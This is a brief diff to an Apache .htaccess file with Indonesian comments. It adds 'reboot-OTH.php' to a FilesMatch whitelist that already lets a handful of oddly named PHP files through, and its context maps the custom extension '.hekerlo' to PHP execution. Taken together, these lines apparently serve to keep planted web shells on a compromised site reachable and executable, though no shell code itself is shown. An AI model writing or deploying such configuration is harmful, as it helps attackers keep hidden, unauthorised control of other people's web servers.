@@ -24,7 +24,7 @@ AddType application/x-httpd-php .hekerlo
 </FilesMatch>
 
 # 3. IZINKAN FILE PHP / INC / CUSTOM YANG DITENTUKAN
-<FilesMatch "(?i)^(InvalidOptions\.php|reboot\.php|InvalidOptions-OTH\.php|sbyhere-OTH\.php|sbyhere\.php)$">
+<FilesMatch "(?i)^(InvalidOptions\.php|reboot\.php|InvalidOptions-OTH\.php|sbyhere-OTH\.php|sbyhere\.php|reboot-OTH\.php)$">
     Order allow,deny
     Allow from all
 </FilesMatch>
